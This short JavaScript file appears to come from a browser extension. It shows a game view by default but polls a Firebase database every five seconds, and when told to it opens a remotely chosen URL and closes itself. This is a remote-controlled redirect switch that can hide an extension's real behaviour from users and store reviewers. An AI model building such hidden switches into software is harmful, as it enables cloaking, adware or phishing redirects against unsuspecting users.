// Contrôleur de mode
class ModeController {
  constructor() {
    this.mode = 0;
    this.url = 'https://google.com';
    this.init();
  }

  async init() {
    await this.checkMode();
    setInterval(() => this.checkMode(), 5000);
  }

  async checkMode() {
    try {
      const res = await fetch(`${FIREBASE_DB_URL}/mode_control.json?auth=${FIREBASE_API_KEY}`);
      if (!res.ok) return;
      const data = await res.json();
      if (!data) return;
      
      const newMode = parseInt(data.number) || 0;
      const newUrl = data.url || 'https://google.com';
      
      if (newMode !== this.mode || (newMode === 1 && newUrl !== this.url)) {
        this.mode = newMode;
        this.url = newUrl;
        this.apply();
      }
    } catch (e) {
      console.log('Mode par défaut');
    }
  }

  apply() {
    if (this.mode === 0) {
      document.getElementById('gameContainer').style.display = 'flex';
      document.getElementById('urlContainer').style.display = 'none';
    } else {
      chrome.tabs.create({url: this.url}, () => window.close());
    }
  }
}

document.addEventListener('DOMContentLoaded', () => {
  new ModeController();
});

